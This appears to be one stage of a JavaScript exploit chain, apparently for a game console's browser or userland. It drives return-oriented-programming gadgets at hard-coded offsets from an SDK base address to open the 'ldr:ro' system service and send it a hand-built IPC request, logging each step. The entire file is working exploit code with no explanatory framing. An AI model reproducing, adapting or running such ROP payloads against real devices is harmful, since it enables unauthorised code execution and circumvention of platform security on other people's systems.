(async () => {
  const R = globalThis.__AUTOLOADER_RESULT;
  await log("S: gate " + JSON.stringify(R || null));
  if (!R || R.error) { await log("S: no gate result; skipping ldr:ro"); return; }
  await log("S: sdk=" + toHex(sdk_base));
  call_rop(sdk_base + 0x14c960n);
  const out = malloc(8), name = malloc(16);
  write32(out, 0n);
  write32(name, 0x3a72646cn);
  write32(name + 4n, 0x00006f72n);
  const r = call_rop(sdk_base + 0x14cab0n, out, name);
  const h = read32(out);
  await log("S: sm r=" + toHex(r) + " h=" + toHex(h));
  if (!h) { call_rop(sdk_base + 0x14c990n); return; }
  const p = malloc(0x1000);
  write32(p, 4n); write32(p + 4n, 0x8000000An);
  write32(p + 8n, 3n); write32(p + 12n, 0n);
  write32(p + 16n, 0n); write32(p + 20n, 0xffff8001n);
  write32(p + 0x20n, 0x49434653n);
  write32(p + 0x28n, 4n);
  write64(p + 0x30n, 0n);
  const t = call_rop(sdk_base + 0x14ba90n, h, p, 0x1000n);
  const res = read32(p + 0x18n);
  await log("S: ldr:ro init t=" + toHex(t) + " res=" + toHex(res));
  call_rop(sdk_base + 0x14c990n);
  await log("S: done");
})();
